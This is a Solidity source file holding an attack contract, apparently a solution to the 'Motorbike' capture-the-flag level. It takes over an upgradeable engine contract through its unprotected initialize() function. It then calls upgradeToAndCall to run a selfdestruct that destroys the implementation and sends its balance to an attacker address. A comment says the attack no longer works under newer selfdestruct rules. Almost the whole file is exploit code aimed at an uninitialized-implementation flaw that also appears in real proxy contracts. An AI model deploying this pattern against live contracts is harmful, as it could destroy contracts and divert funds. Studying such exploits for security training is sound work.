// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//This attack won't work, due to the change in the way selfdestruct is handled by solidity now
interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external; 
}

contract MotorBikeAttack {

    IEngine target;

    constructor(address _targetAddress) {
        target = IEngine(_targetAddress);
        target.initialize();
    }

    function attack(address _attackerAddress) external {
        bytes memory data = abi.encodeWithSelector(this.destroy.selector, _attackerAddress);
        target.upgradeToAndCall(address(this), data);
    }

    function destroy(address _attackerAddress) public {
        selfdestruct(payable(_attackerAddress));
    }
}
